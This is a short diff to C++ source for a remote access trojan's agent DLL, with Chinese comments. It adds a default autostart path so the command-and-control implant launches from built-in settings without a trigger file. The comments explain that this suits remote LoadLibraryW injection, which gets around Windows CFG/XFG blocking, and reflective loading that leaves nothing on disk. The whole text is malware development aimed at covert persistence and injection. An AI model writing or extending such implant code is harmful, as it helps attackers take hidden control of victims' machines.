@@ -166,7 +166,14 @@ namespace
         Sleep(300);
         std::string args;
         if (!c2::agent_autostart_requested(args))
+        {
+            // 没有触发器文件：只有显式开关（RAT_AUTOSTART_DEFAULT=1）打开时才自启
+            if (!c2::agent_autostart_default_enabled())
+                return 0;
+            printf("[*] autostart (no trigger, default config) %s\n", c2::agent_version());
+            start_from_args(nullptr);   // nullptr → fill_dll_defaults 的内置默认
             return 0;
+        }
         printf("[*] autostart (trigger) mode=%s\n", c2::agent_version());
         start_from_args(args.empty() ? nullptr : args.c_str());
         return 0;
@@ -264,7 +271,12 @@ BOOL WINAPI DllMain(HINSTANCE, DWORD reason, LPVOID)
         // 注入场景：现代 Windows 的 CFG/XFG 会拦"远程线程入口指向镜像内任意导出"
         //（0xC0000409 失败），但远程 LoadLibraryW 可用 → 由本 DLL 自己按触发器启动。
         // 这里只做一次轻量文件探测（无堆分配），重活交给 _beginthreadex 的新线程。
-        if (c2::agent_autostart_trigger_present())
+        //
+        // 两条自启路径：
+        //   1) autostart.args 触发器存在（内容 = 参数串）——默认行为，一直是"开关"；
+        //   2) 显式开关 RAT_AUTOSTART_DEFAULT=1 —— 反射加载这类没有参数通道的场景，
+        //      不落盘也能按内置默认配置自启（见 agent_runtime.h 说明）。
+        if (c2::agent_autostart_trigger_present() || c2::agent_autostart_default_enabled())
         {
             HANDLE t = (HANDLE)_beginthreadex(nullptr, 0, autostart_proc, nullptr, 0, nullptr);
             if (t)
